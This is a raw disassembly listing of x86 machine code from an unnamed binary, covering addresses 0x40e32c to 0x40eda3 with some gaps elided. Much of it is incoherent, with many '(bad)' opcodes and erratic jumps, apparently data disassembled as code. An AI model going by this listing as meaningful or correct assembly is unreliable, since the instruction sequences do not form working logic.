  40e32c:	shl    DWORD PTR [esi-0x3dc156e5],cl
  40e332:	add    cl,BYTE PTR [ebp-0xfa004d]
  40e338:	inc    ecx
  40e339:	es ret 0x8e2b
  40e33d:	dec    esp
  40e33e:	cmp    ecx,DWORD PTR [edi+0x7f]
  40e341:	mov    ah,0x1a
  40e343:	ret    0xb4a5
  40e346:	add    cl,BYTE PTR [ebx]
  40e348:	(bad)  
  40e349:	pop    ebx
  40e34a:	fadd   QWORD PTR [eax]
  40e34c:	daa    
  40e34d:	fsubr  st,st(0)
  40e34f:	add    edi,DWORD PTR [esi]
  40e351:	stos   BYTE PTR es:[edi],al
  40e352:	fcomi  st,st(7)
  40e354:	and    ebp,edx
  40e356:	jno    0x40e35f
  40e358:	add    DWORD PTR [edi+0x29],edx
  40e35b:	xchg   ecx,eax
  40e35c:	dec    eax
  40e35d:	xor    esi,DWORD PTR [ebx-0x44]
  40e360:	jle    0x40e3bd
  40e362:	ss xchg ecx,eax
  40e364:	xor    eax,0xe17325b3
  40e369:	stos   BYTE PTR es:[edi],al
  40e36a:	adc    edx,edi
  40e36c:	addr16 pop ebx
  40e36e:	push   ds
  40e36f:	xchg   ecx,eax
  40e370:	inc    ebp
  40e371:	mov    bl,0x51
  40e373:	jae    0x40e33e
  40e375:	stos   BYTE PTR es:[edi],al
  40e376:	pop    ebx
  40e377:	jno    0x40e379
	...
  40e3a1:	add    ah,bh
  40e3a3:	test   eax,0xdcb0705
  40e3a8:	int    0xb1
  40e3aa:	add    DWORD PTR [ebx-0x55568d0b],esi
  40e3b0:	cwde   
  40e3b1:	push   es
  40e3b2:	sub    ecx,DWORD PTR [ebx+0x39]
  40e3b5:	pop    es
  40e3b6:	adc    edx,DWORD PTR [ebx-0x2f]
  40e3b9:	or     DWORD PTR [eax-0x7be42a56],edx
  40e3bf:	fcmove st,st(5)
  40e3c1:	push   es
  40e3c2:	xchg   ebp,eax
  40e3c3:	push   ds
  40e3c4:	je     0x40e387
  40e3c6:	and    eax,0x704f63d4
  40e3cb:	stos   BYTE PTR es:[edi],al
  40e3cc:	mov    ch,0x6
  40e3ce:	repz dec edx
  40e3d0:	scas   al,BYTE PTR es:[edi]
  40e3d1:	push   eax
  40e3d2:	stos   BYTE PTR es:[edi],al
  40e3d3:	test   eax,0x106606a5
  40e3d8:	sbb    eax,0xa9563e04
  40e3dd:	(bad)  
  40e3de:	and    DWORD PTR [ebx],esi
  40e3e0:	arpl   WORD PTR [ebx-0x6f79a502],di
  40e3e6:	inc    ebp
  40e3e7:	mov    bl,0xd
  40e3e9:	jae    0x40e41c
  40e3eb:	stos   BYTE PTR es:[edi],al
  40e3ec:	push   DWORD PTR [ebp-0x72]
  40e3ef:	out    dx,eax
  40e3f0:	std    
  40e3f1:	outs   dx,BYTE PTR ds:[esi]
  40e3f2:	cmp    BYTE PTR [ebx],cl
  40e3f4:	call   0xfeeb7097
  40e3f9:	mov    ecx,0xe174a8cd
  40e3fe:	and    eax,0x384efe2b
  40e403:	mov    bl,0xb4
  40e405:	jbe    0x40e407
	...
  40e42f:	add    BYTE PTR [eax-0x56],al
  40e432:	mov    WORD PTR [edi+edi*2-0x57],fs
  40e436:	(bad)  
  40e437:	lods   eax,DWORD PTR ss:[esi]
  40e439:	test   al,0xb4
  40e43b:	ins    DWORD PTR es:[edi],dx
  40e43c:	cmp    ebp,DWORD PTR [edx+0x24e211fe]
  40e442:	add    cl,ch
  40e444:	mov    esi,0xd56c0e9a
  40e449:	test   al,0xfe
  40e44b:	push   cs
  40e44c:	cmp    al,dh
  40e44e:	mov    ebx,0xe7aa4007
  40e453:	aad    0xc4
  40e455:	test   eax,0xe2f9f6fe
  40e45a:	std    
  40e45b:	out    dx,al
  40e45c:	cmp    esi,DWORD PTR [ebx-0x55bc897c]
  40e462:	enter  0x96ab,0xa9
  40e466:	push   ebx
  40e467:	bound  esp,QWORD PTR [esi]
  40e469:	fadd   st(3),st
  40e46b:	cdq    
  40e46c:	cmp    BYTE PTR [edx-0x1d065102],ch
  40e472:	std    
  40e473:	mov    esi,0xe9005b3b
  40e478:	cmp    eax,0x66dd44d6
  40e47d:	jmp    0x62fed0f5
  40e482:	add    BYTE PTR [ecx+edx*2],dl
  40e485:	mov    dl,0x8
  40e487:	call   0x9fa93fc9
  40e48c:	mov    ebx,DWORD PTR [edx]
  40e48e:	add    BYTE PTR [eax],al
  40e490:	rcr    al,0xa
  40e493:	call   0x40e498
	...
  40e4bc:	add    BYTE PTR [eax],al
  40e4be:	shr    BYTE PTR ds:0x289effff,0xb8
  40e4c5:	(bad)  
  40e4c6:	nop
  40e4c7:	pop    esi
  40e4c8:	push   0x5d263e
  40e4cd:	lea    ebx,[edx+0x70fffe1d]
  40e4d3:	out    dx,eax
  40e4d4:	out    0x67,al
  40e4d6:	pusha  
  40e4d7:	pop    esi
  40e4d8:	dec    DWORD PTR [ebp-0x1e296]
  40e4de:	xor    bh,ch
  40e4e0:	std    
  40e4e1:	mov    ch,0x6f
  40e4e3:	popa   
  40e4e4:	(bad)  
  40e4e5:	(bad)  
  40e4e6:	jg     0x40e51c
  40e4e8:	jp     0x40e4ea
  40e4ea:	out    0x25,eax
  40e4ec:	test   DWORD PTR [ecx+esi*1-0x1fbf00a2],edi
  40e4f3:	sub    dh,al
  40e4f5:	add    bh,dl
  40e4f7:	pop    esp
  40e4f8:	lea    edx,[ebp-0x9e9b]
  40e4fe:	test   al,0x5a
  40e500:	adc    BYTE PTR [eax],al
  40e502:	xchg   edi,eax
  40e503:	pop    esp
  40e504:	je     0x41440a
  40e50a:	adc    bh,BYTE PTR [ecx]
  40e50c:	ret    0x70fe
  40e50f:	pop    edi
  40e510:	lea    eax,[edx+0x43]
  40e513:	out    dx,eax
  40e514:	leavew 
  40e516:	and    BYTE PTR [esi+edi*8-0x12aec19],bl
  40e51d:	jmp    FWORD PTR [esp+ebx*1+0x75]
  40e521:	add    al,BYTE PTR [eax]
	...
  40e54b:	add    BYTE PTR [ecx+ebx*8-0x75],bh
  40e54f:	xchg   ebp,eax
  40e550:	xchg   ebp,eax
  40e551:	pop    esi
  40e552:	(bad)  
  40e553:	call   edx
  40e555:	cdq    
  40e556:	sub    dl,BYTE PTR [eax+0x2f]
  40e559:	bound  ecx,QWORD PTR [edi+0x41]
  40e55c:	ds mov dl,0x1a
  40e55f:	push   edx
  40e560:	les    esi,FWORD PTR [ecx-0x5901f4fe]
  40e566:	add    bl,ch
  40e568:	xchg   ebp,eax
  40e569:	aaa    
  40e56a:	outs   dx,BYTE PTR ds:[esi]
  40e56b:	ret    0x3128
  40e56e:	add    al,0x8d
  40e570:	jl     0x40e558
  40e572:	jns    0x40e4f9
  40e574:	sar    BYTE PTR [edi],cl
  40e576:	add    al,0xff
  40e578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e579:	sub    al,0xbb
  40e57b:	inc    eax
  40e57c:	adc    DWORD PTR ds:[esi+0x70f1160b],ecx
  40e583:	(bad)  
  40e584:	stc    
  40e585:	and    BYTE PTR [esi-0x4c],cl
  40e588:	lock push 0x10d65004
  40e58e:	jno    0x40e58f
  40e590:	loope  0x40e5cc
  40e592:	jle    0x40e544
  40e594:	fadd   DWORD PTR [eax-0x3b99affc]
  40e59a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e59b:	inc    eax
  40e59c:	ds push ecx
  40e59e:	dec    esi
  40e59f:	mov    al,0xc0
  40e5a1:	pop    eax
  40e5a2:	add    al,0xe8
  40e5a4:	inc    edi
  40e5a5:	fld    QWORD PTR [edx]
  40e5a7:	add    BYTE PTR [ebp+0x72],al
  40e5aa:	(bad)  
  40e5ab:	adc    dl,BYTE PTR [esi]
  40e5ad:	sub    ah,BYTE PTR [esi+0x40]
	...
  40e5d7:	add    BYTE PTR [eax],al
  40e5d9:	add    BYTE PTR [esi],bh
  40e5db:	mov    ecx,0xc098b04c
  40e5e0:	add    bh,bh
  40e5e2:	or     ebp,DWORD PTR [edx-0x6f748716]
  40e5e8:	add    ch,al
  40e5ea:	pop    es
  40e5eb:	or     BYTE PTR [ebx],al
  40e5ed:	dec    ebx
  40e5ef:	ss (bad) 
  40e5f1:	std    
  40e5f2:	jno    0x40e5dc
  40e5f4:	push   ebx
  40e5f5:	push   DWORD PTR [ebx+0x61ff022d]
  40e5fb:	cdq    
  40e5fc:	call   0xe99c2479
  40e601:	mov    BYTE PTR [ecx+0x49496457],dl
  40e607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e608:	xchg   ebp,eax
  40e609:	add    ecx,DWORD PTR [ebx+0x39038ee6]
  40e60f:	mov    ah,0xa0
  40e611:	jge    0x40e651
  40e613:	pop    ebx
  40e614:	jle    0x40e5cf
  40e616:	icebp  
  40e617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e618:	jne    0x40e61d
  40e61a:	push   ss
  40e61b:	adc    eax,0x9519035f
  40e620:	sub    cl,BYTE PTR [esi+edi*1]
  40e623:	adc    BYTE PTR [edx-0x10],dh
  40e626:	or     BYTE PTR [ecx],dh
  40e628:	in     eax,0xeb
  40e62a:	scas   eax,DWORD PTR es:[edi]
  40e62b:	leave  
  40e62c:	dec    ebp
  40e62d:	add    eax,DWORD PTR [ebp-0x65]
  40e630:	mov    esp,0x3e0b8e12
  40e635:	jns    0x40e66d
  40e637:	mov    bl,0x81
  40e639:	add    ah,cl
  40e63b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e63c:	inc    eax
  40e63d:	sub    eax,DWORD PTR [eax]
	...
  40e667:	add    al,cl
  40e669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e66a:	and    eax,0xe953ffcd
  40e66f:	pop    eax
  40e670:	mov    ch,0xb7
  40e672:	imul   ecx,eax,0x6de931c5
  40e678:	pop    edi
  40e679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e67a:	jnp    0x40e687
  40e67c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e67d:	adc    al,0x72
  40e67f:	add    ebp,DWORD PTR [ecx+0x17ffabd4]
  40e685:	inc    ecx
  40e686:	out    dx,al
  40e687:	js     0x40e6cf
  40e689:	mov    bl,0xa5
  40e68b:	add    dl,BYTE PTR [ecx-0x76d8ad5a]
  40e691:	xor    cl,ah
  40e693:	jmp    0x40e65f
  40e695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e696:	int    0x2
  40e698:	in     al,0x46
  40e69a:	(bad)  
  40e69b:	js     0x40e6e3
  40e69d:	mov    bl,0x91
  40e69f:	add    ch,BYTE PTR [ecx-0x5a]
  40e6a2:	inc    DWORD PTR [edx+0x3a]
  40e6a5:	xor    ebx,DWORD PTR [edx+0x685b030c]
  40e6ab:	imul   ebx,esi,0x1b
  40e6ae:	add    BYTE PTR [esi+0x2847f506],bl
  40e6b4:	cmp    dh,BYTE PTR [ebx-0x59c38610]
  40e6ba:	or     ch,BYTE PTR [ecx+0x11504fa9]
  40e6c0:	stos   BYTE PTR es:[edi],al
  40e6c1:	or     BYTE PTR [ecx-0x17],al
  40e6c4:	lea    esp,[esi-0x64da1e8c]
  40e6ca:	sti    
  40e6cb:	data16 add BYTE PTR [eax],al
	...
  40e6f6:	cmp    al,0xb3
  40e6f8:	shr    BYTE PTR [esp+edi*1-0x5a],0x69
  40e6fd:	jmp    0xa89dd897
  40e702:	cmp    eax,0x7aa48233
  40e707:	pop    ebx
  40e708:	push   esp
  40e70a:	scas   eax,DWORD PTR es:[edi]
  40e70b:	sbb    eax,0x9bd5e941
  40e710:	(bad)  
  40e711:	cs cmp al,0x52
  40e714:	rcr    BYTE PTR [ebp-0x5e97f4d7],0x5e
  40e71b:	sbb    al,0x0
  40e71d:	mov    ecx,0x108303c
  40e722:	shl    DWORD PTR [ecx-0x345af902],cl
  40e728:	mov    esi,?
  40e72a:	aas    
  40e72b:	xor    DWORD PTR [eax],eax
  40e72d:	cmp    DWORD PTR ds:0x28cbc33,0x5b
  40e734:	push   0x805b3de9
  40e739:	shl    DWORD PTR [edi+0x33d6fed5],1
  40e73f:	fwait
  40e740:	jae    0x40e747
  40e742:	adc    cl,BYTE PTR [ebx]
  40e744:	call   0xfe050849
  40e749:	jmp    FWORD PTR [ecx+ebx*4+0x72]
  40e74d:	adc    al,0x47
  40e74f:	aaa    
  40e750:	js     0x40e7af
  40e752:	es pop edi
  40e754:	push   eax
  40e755:	push   DWORD PTR [edx]
  40e757:	push   edi
  40e758:	call   0x40e7b9
	...
  40e781:	add    BYTE PTR [eax],al
  40e783:	add    BYTE PTR [ebx+0xbe8ff5b],ch
  40e789:	(bad)  
  40e78a:	std    
  40e78b:	(bad)  
  40e78c:	mov    edi,0xb8ff8d02
  40e791:	pop    edx
  40e792:	jne    0x40e790
  40e794:	test   al,0x2c
  40e796:	or     al,ch
  40e798:	fst    st(5)
  40e79a:	std    
  40e79b:	(bad)  
  40e79c:	ficomp WORD PTR [ebp-0x282dfffe]
  40e7a2:	jmp    0x68ff:0xf5ab6381
  40e7a9:	aam    0x43
  40e7ab:	cld    
  40e7ac:	mov    bh,0x5b
  40e7ae:	jne    0x40e7c0
  40e7b0:	js     0x40e7de
  40e7b2:	or     al,0xe8
  40e7b4:	cmc    
  40e7b5:	and    DWORD PTR [eax],eax
  40e7b7:	add    ah,bl
  40e7b9:	cwde   
  40e7ba:	or     eax,0x5f1c85
  40e7bf:	add    BYTE PTR [eax],ah
  40e7c1:	sbb    al,0xf8
  40e7c3:	add    bh,dl
  40e7c5:	pop    eax
  40e7c6:	add    bh,al
  40e7c8:	xchg   edx,eax
  40e7c9:	lods   al,BYTE PTR ds:[esi]
  40e7ca:	std    
  40e7cb:	pop    es
  40e7cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7cd:	pop    eax
  40e7ce:	push   0x0
  40e7d0:	int    0x58
  40e7d2:	push   0x0
  40e7d4:	int    0x58
  40e7d6:	lea    eax,[ebp-0x5d]
  40e7d9:	or     BYTE PTR [ebp-0x25c6c7b],cl
  40e7df:	call   DWORD PTR [edi+0x5a]
  40e7e2:	jne    0x40e7dc
  40e7e4:	push   0xe8fc2d
	...
  40e811:	add    BYTE PTR [esi],bh
  40e813:	inc    esi
  40e814:	jnp    0x40e816
  40e816:	ds mov ecx,0x8b3b73c2
  40e81c:	nop
  40e81d:	jmp    FWORD PTR [ecx-0x4e]
  40e820:	push   0xffffff8a
  40e822:	div    BYTE PTR [edx+0x4]
  40e825:	call   ebx
  40e827:	sub    edx,0xfffdae84
  40e82d:	dec    edi
  40e82e:	mov    ch,0xe2
  40e830:	lea    eax,[edx+ecx*2-0x7101003b]
  40e837:	pusha  
  40e838:	in     al,dx
  40e839:	je     0x40e809
  40e83b:	fdiv   st(7),st
  40e83d:	mov    bl,al
  40e83f:	and    eax,edi
  40e841:	(bad)  
  40e842:	and    edx,ebx
  40e844:	retf   
  40e845:	mov    ebx,DWORD PTR [ecx]
  40e847:	xor    eax,0xb0a6006d
  40e84c:	pusha  
  40e84d:	inc    ecx
  40e84e:	ds add eax,0xd09efb6
  40e854:	add    bh,bh
  40e856:	jae    0x40e7de
  40e858:	jmp    0xc389:0x1cc1cd
  40e85f:	adc    eax,0x30e1fef8
  40e864:	mov    esi,0x74d1eb
  40e869:	add    BYTE PTR [edx-0x5f],cl
  40e86c:	push   0x1
  40e86e:	ds push ebp
  40e870:	sar    esi,0x8b
  40e873:	pop    ebp
  40e874:	clc    
  40e875:	inc    BYTE PTR [eax]
	...
  40e89f:	add    BYTE PTR [ecx-0x59f789ac],bh
  40e8a5:	fnstenv [esi+edi*8-0x144b5b57]
  40e8ac:	test   eax,0xc7e7feac
  40e8b1:	add    eax,0x5a91ff00
  40e8b6:	pushf  
  40e8b7:	hlt    
  40e8b8:	nop
  40e8b9:	mov    ds:0x570affdd,eax
  40e8be:	(bad)  
  40e8bf:	jns    0x40e907
  40e8c1:	mov    bl,0x18
  40e8c3:	push   DWORD PTR [eax-0x5d]
  40e8c6:	lds    edi,FWORD PTR [ecx-0x4254a7]
  40e8cc:	pop    ecx
  40e8cd:	xor    eax,0xa358ff65
  40e8d2:	and    edi,esp
  40e8d4:	pushw  ds
  40e8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d7:	dec    DWORD PTR [eax-0x5d]
  40e8da:	adc    eax,DWORD PTR [eax]
  40e8dc:	push   esi
  40e8dd:	rcl    DWORD PTR [eax],1
  40e8df:	add    al,0x3e
  40e8e1:	xchg   esp,eax
  40e8e2:	stos   BYTE PTR es:[edi],al
  40e8e3:	adc    BYTE PTR [esi],bh
  40e8e5:	or     BYTE PTR [edx-0x10],dh
  40e8e8:	mov    esi,0x20f79097
  40e8ed:	mov    ds:0xc1a4963,eax
  40e8f2:	outs   dx,BYTE PTR ds:[esi]
  40e8f3:	jns    0x40e923
  40e8f5:	mov    ds:0x2f160fdb,al
  40e8fa:	loope  0x40e8ff
  40e8fc:	ds push esi
  40e8fe:	sub    DWORD PTR [edi],ecx
  40e900:	ret    
  40e901:	inc    ecx
  40e902:	call   0x40e90a
	...
  40e92b:	add    BYTE PTR [eax],al
  40e92d:	add    BYTE PTR [esi],bh
  40e92f:	call   0x3e8:0xa2e9fbab
  40e936:	stc    
  40e937:	sbb    BYTE PTR ds:0xe95b40ff,bh
  40e93d:	imul   edi,DWORD PTR [esi],0x3e69e935
  40e943:	xor    eax,0xa77a90e9
  40e948:	mov    eax,0x15a7c290
  40e94d:	push   DWORD PTR [eax-0x5986f9f5]
  40e953:	mov    ds:0x1899ff73,al
  40e958:	add    BYTE PTR [ecx+0x3d],dh
  40e95b:	pop    ebx
  40e95c:	or     ebp,DWORD PTR [ecx]
  40e95e:	push   ss
  40e95f:	pop    eax
  40e960:	jmp    0x9c272d
  40e965:	push   ecx
  40e966:	mov    ah,0x1a
  40e968:	inc    ecx
  40e969:	jmp    0xc15110e6
  40e96e:	retf   
  40e96f:	sar    esi,1
  40e971:	(bad)  
  40e972:	or     eax,0xb66ccfd6
  40e977:	scas   al,BYTE PTR es:[edi]
  40e978:	div    BYTE PTR [esi-0x3eadeda8]
  40e97e:	mov    ebx,0xbaa6fed1
  40e983:	xlat   BYTE PTR ds:[ebx]
  40e984:	out    dx,eax
  40e985:	xchg   esi,eax
  40e986:	inc    eax
  40e987:	mov    eax,ds:0xa0c4b5e7
  40e98c:	inc    BYTE PTR [ebx]
  40e98e:	cmp    dh,BYTE PTR ds:0x8600
	...
  40e9bc:	out    0xb1,al
  40e9be:	idiv   BYTE PTR [esi+0x20]
  40e9c1:	mov    eax,ds:0xbc25e574
  40e9c6:	lea    ebp,[esi+0x10]
  40e9c9:	rol    DWORD PTR [ebp+edx*2+0x5efea110],cl
  40e9d0:	(bad)  
  40e9d1:	mov    ch,0xf6
  40e9d3:	push   esi
  40e9d4:	clc    
  40e9d5:	mov    ecx,0xa0f0748a
  40e9da:	or     ch,BYTE PTR [ecx]
  40e9dc:	jno    0x40ea1c
  40e9de:	push   eax
  40e9df:	jo     0x40e997
  40e9e1:	mov    ecx,0xa0d836f6
  40e9e6:	mov    ah,0x41
  40e9e8:	enter  0xfea0,0x11
  40e9ec:	cmc    
  40e9ed:	sar    esi,1
  40e9ef:	push   ds
  40e9f0:	xor    al,0x9b
  40e9f2:	jae    0x40e995
  40e9f4:	and    eax,0xf2fe005d
  40e9f9:	cmp    DWORD PTR [esi+0x16e100],eax
  40e9ff:	jmp    FWORD PTR [edx-0x4a]
  40ea02:	cmc    
  40ea03:	call   DWORD PTR [eax+0x3f08739f]
  40ea09:	pop    ds
  40ea0a:	mov    ah,0xff
  40ea0c:	mov    al,ds:0x7000022e
  40ea11:	loopne 0x40ea79
  40ea13:	xchg   esi,eax
  40ea14:	xor    DWORD PTR [esi],ebx
  40ea16:	add    bh,bh
  40ea18:	retf   0xf5ae
  40ea1b:	inc    DWORD PTR [eax+0x8739f]
	...
  40ea49:	add    BYTE PTR [edi-0x6f004bc3],cl
  40ea4f:	add    BYTE PTR cs:[eax],al
  40ea52:	nop
  40ea53:	loopne 0x40eabb
  40ea55:	fiadd  DWORD PTR [edx]
  40ea57:	push   ds
  40ea58:	add    bh,bh
  40ea5a:	jmp    0x739e:0xd0fff5ae
  40ea61:	or     BYTE PTR [edi-0x3f004bec],bh
  40ea67:	scas   eax,DWORD PTR es:[edi]
  40ea68:	push   eax
  40ea69:	mov    esp,DWORD PTR [eax-0x3c4a0262]
  40ea6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea70:	std    
  40ea71:	(bad)  
  40ea72:	mov    edi,0xa0ff8b16
  40ea77:	sahf   
  40ea78:	mov    bl,0xf0
  40ea7a:	push   0x1afffd9e
  40ea7f:	push   ecx
  40ea80:	push   DWORD PTR [ebp-0x21]
  40ea83:	mov    ah,0xdb
  40ea85:	inc    BYTE PTR [eax+0x27b5fd9e]
  40ea8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea8c:	std    
  40ea8d:	(bad)  
  40ea8e:	jg     0x40eb02
  40ea90:	mov    edi,edi
  40ea92:	and    BYTE PTR [esi-0x53d107bd],bl
  40ea98:	cld    
  40ea99:	jmp    DWORD PTR [eax]
  40ea9b:	sahf   
  40ea9c:	jae    0x40ea9a
  40ea9e:	ds pop edx
  40eaa0:	inc    ebp
  40eaa1:	ja     0x40eae1
  40eaa3:	mov    dl,0xc9
  40eaa5:	sar    DWORD PTR [edx],0xb2
  40eaa8:	push   ebp
  40eaa9:	mov    edx,DWORD PTR [edx+0xfbc835]
	...
  40ead7:	add    BYTE PTR [edx+esi*4],ah
  40eada:	push   0xb279122
  40eadf:	call   0xff3d152f
  40eae4:	mov    bh,0x77
  40eae6:	add    BYTE PTR [eax+0x3e],ch
  40eae9:	mov    dl,0xeb
  40eaeb:	mov    ebp,0x415debe6
  40eaf0:	ds or  ch,dl
  40eaf3:	pop    esp
  40eaf4:	push   DWORD PTR [ecx-0x65b98b05]
  40eafa:	sub    dh,BYTE PTR [ecx+edx*2-0x140d950f]
  40eb01:	jb     0x40eb07
  40eb03:	dec    DWORD PTR [ebx]
  40eb05:	adc    BYTE PTR [ebx+0x41],cl
  40eb08:	ds leave 
  40eb0a:	jne    0x40eb14
  40eb0c:	es and bh,dh
  40eb0f:	(bad)  
  40eb10:	sub    DWORD PTR [edx-0xe],ecx
  40eb13:	pop    esp
  40eb14:	jg     0x40eac8
  40eb16:	push   0x2
  40eb18:	ds mov dl,0x82
  40eb1b:	dec    BYTE PTR [ebx+0xb7deaba]
  40eb21:	cmp    esp,edi
  40eb23:	addr16 cmp al,ah
  40eb26:	inc    ecx
  40eb27:	add    BYTE PTR [esi-0x4c],ah
  40eb2a:	add    al,BYTE PTR [eax]
  40eb2c:	mov    esi,0xd6087610
  40eb31:	cld    
  40eb32:	cld    
  40eb33:	(bad)  
  40eb34:	loope  0x40eabf
  40eb36:	inc    esp
  40eb37:	pop    esi
  40eb38:	jg     0x40eaec
  40eb3a:	push   0x2
	...
  40eb64:	add    BYTE PTR [eax],al
  40eb66:	ds mov dl,0x82
  40eb69:	(bad)  
  40eb6a:	push   ebx
  40eb6b:	pop    ebx
  40eb6c:	icebp  
  40eb6d:	jmp    0x40ebe5
  40eb6f:	mov    eax,ds:0x25b8fc1d
  40eb74:	adc    eax,0x1532afc
  40eb79:	push   ss
  40eb7a:	mov    dh,0x9f
  40eb7c:	add    eax,0xe9567fca
  40eb81:	push   esi
  40eb82:	lds    ebp,FWORD PTR [esi-0x4cbd8a0b]
  40eb88:	or     BYTE PTR [ebp-0x3c0e6078],cl
  40eb8e:	or     eax,0x1bbb5162
  40eb93:	sbb    ch,cl
  40eb95:	push   ebx
  40eb96:	cs pop di
  40eb99:	sti    
  40eb9a:	push   0x3e6c190a
  40eb9f:	pop    ebx
  40eba0:	into   
  40eba1:	mov    edx,0x4516fce1
  40eba6:	or     ebp,DWORD PTR ds:[esi+0x3eb33671]
  40ebad:	mov    bh,0x40
  40ebaf:	lahf   
  40ebb0:	inc    eax
  40ebb1:	ins    BYTE PTR es:[edi],dx
  40ebb2:	aas    
  40ebb3:	pop    ebx
  40ebb4:	xchg   BYTE PTR [edx+0x452eec99],bh
  40ebba:	or     eax,DWORD PTR ds:[esi+0x2ab33671]
  40ebc1:	mov    bh,0x18
  40ebc3:	lahf   
  40ebc4:	or     BYTE PTR [edi-0x3c],0x9e
  40ebc8:	ins    DWORD PTR es:[edi],dx
  40ebc9:	int    0x0
	...
  40ebf3:	add    bh,bh
  40ebf5:	push   ebx
  40ebf6:	jmp    0x69f0a14b
  40ebfb:	shl    ch,0x31
  40ebfe:	jmp    0xd3df0970
  40ec03:	or     edx,esi
  40ec05:	xor    BYTE PTR [esi-0x5],ch
  40ec08:	loopne 0x40ebde
  40ec0a:	mov    ds:0x4167f7,eax
  40ec0f:	ss dec edi
  40ec11:	push   ebx
  40ec12:	call   0xfedeb16b
  40ec17:	xchg   ebx,eax
  40ec18:	sbb    BYTE PTR [esi-0x2e5a0e8c],bl
  40ec1e:	(bad)  
  40ec1f:	push   ss
  40ec20:	mov    ch,0x34
  40ec22:	sbb    al,0xe
  40ec24:	das    
  40ec25:	push   ebx
  40ec26:	call   0xfede9193
  40ec2b:	dec    BYTE PTR [esi]
  40ec2d:	lahf   
  40ec2e:	(bad)  
  40ec2f:	jl     0x40ec76
  40ec31:	mov    bl,0x86
  40ec33:	test   WORD PTR [ebp-0x617e5438],bx
  40ec3a:	push   ebx
  40ec3b:	jb     0x40ec9e
  40ec3d:	or     edi,eax
  40ec3f:	in     al,dx
  40ec40:	repnz cmp al,BYTE PTR [ecx-0x17]
  40ec44:	cmp    eax,0x10e9005b
  40ec49:	cmp    dh,0x34
  40ec4c:	dec    edx
  40ec4d:	mov    bl,0xc2
  40ec4f:	cmp    eax,0x148b5b3a
  40ec54:	cmp    bl,dl
  40ec56:	imul   ebx
	...
  40ec80:	add    BYTE PTR [eax],al
  40ec82:	iret   
  40ec83:	dec    ebx
  40ec84:	add    edi,DWORD PTR [ecx+0xf01b3c0]
  40ec8a:	mov    ebx,0xaf2d5c63
  40ec8f:	pop    eax
  40ec90:	data16 scas al,BYTE PTR es:[edi]
  40ec92:	cmp    edi,edi
  40ec94:	(bad)  
  40ec95:	jge    0x40ec25
  40ec97:	dec    edi
  40ec98:	call   0x9c7b90
  40ec9d:	add    DWORD PTR [esi+edi*8+0x40],esp
  40eca1:	jmp    0xa89e7a3b
  40eca6:	cmp    eax,0xf47d39b3
  40ecab:	pushf  
  40ecac:	or     ch,BYTE PTR [ecx]
  40ecae:	pop    ecx
  40ecaf:	cmp    bh,bh
  40ecb1:	add    BYTE PTR [edx-0x46ea00af],ah
  40ecb7:	add    BYTE PTR [ecx+0x0],al
  40ecba:	fiadd  WORD PTR fs:[edx]
  40ecbd:	or     edx,DWORD PTR [edi]
  40ecbf:	sub    edx,DWORD PTR [ebp-0x1]
  40ecc2:	ret    0x5f33
  40ecc5:	inc    ecx
  40ecc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecc7:	hlt    
  40ecc8:	ja     0x40ed2a
  40ecca:	out    0x59,al
  40eccc:	cmp    DWORD PTR ds:0x4139ce,0xffffff97
  40ecd3:	sub    cl,BYTE PTR [eax]
  40ecd5:	push   DWORD PTR [edx+0x37]
  40ecd8:	pop    edi
  40ecd9:	inc    ecx
  40ecda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecdb:	lods   al,BYTE PTR ds:[esi]
  40ecdc:	aaa    
  40ecdd:	push   0xffffff97
  40ecdf:	das    
  40ece0:	add    edi,edi
  40ece2:	and    ah,BYTE PTR [edx]
  40ece4:	pusha  
  40ece5:	inc    ecx
	...
  40ed0e:	add    BYTE PTR [eax],al
  40ed10:	addr16 mov ds:0x7213,al
  40ed14:	sub    BYTE PTR [edx],bl
  40ed16:	add    BYTE PTR [ebx-0x3ff4ad5d],al
  40ed1c:	and    edi,DWORD PTR [edx-0x1]
  40ed1f:	xor    eax,0x4136fe
  40ed24:	mov    BYTE PTR [ebp+0x7a],cl
  40ed27:	pop    edi
  40ed28:	push   ss
  40ed29:	push   edi
  40ed2a:	add    esp,0x53
  40ed2d:	mov    ds:0x18786213,al
  40ed32:	add    bh,al
  40ed34:	and    ah,BYTE PTR [edx]
  40ed36:	pusha  
  40ed37:	inc    ecx
  40ed38:	pop    ss
  40ed39:	pop    ecx
  40ed3a:	add    BYTE PTR [eax],al
  40ed3c:	pop    ss
  40ed3d:	mov    al,0xff
  40ed3f:	inc    edx
  40ed40:	mov    WORD PTR [esi+0x4fe5c959],ss
  40ed46:	add    BYTE PTR [ebx+0x416021da],al
  40ed4c:	pop    ss
  40ed4d:	pop    ecx
  40ed4e:	je     0x40ed6f
  40ed50:	cwde   
  40ed51:	ins    BYTE PTR es:[edi],dx
  40ed52:	jns    0x40edb4
  40ed54:	ds repz add bh,bh
  40ed58:	push   ebx
  40ed59:	mov    BYTE PTR [edi+0x41],dl
  40ed5c:	ds xor eax,eax
  40ed5f:	add    ebx,ecx
  40ed61:	xchg   DWORD PTR [edi+ebx*2+0x7f],esp
  40ed65:	mov    dl,0xbf
  40ed67:	add    al,0x47
  40ed69:	xchg   edx,eax
  40ed6a:	inc    ecx
  40ed6b:	add    BYTE PTR [esi],bh
  40ed6d:	mov    dl,0x2
  40ed6f:	add    BYTE PTR [ebp-0x19],bh
  40ed72:	mov    ebp,ebx
	...
  40ed9c:	add    BYTE PTR [eax],al
  40ed9e:	mov    ebp,0xb552f46e
  40eda3:	test   DWORD PTR [edx],0xc1e7e0b
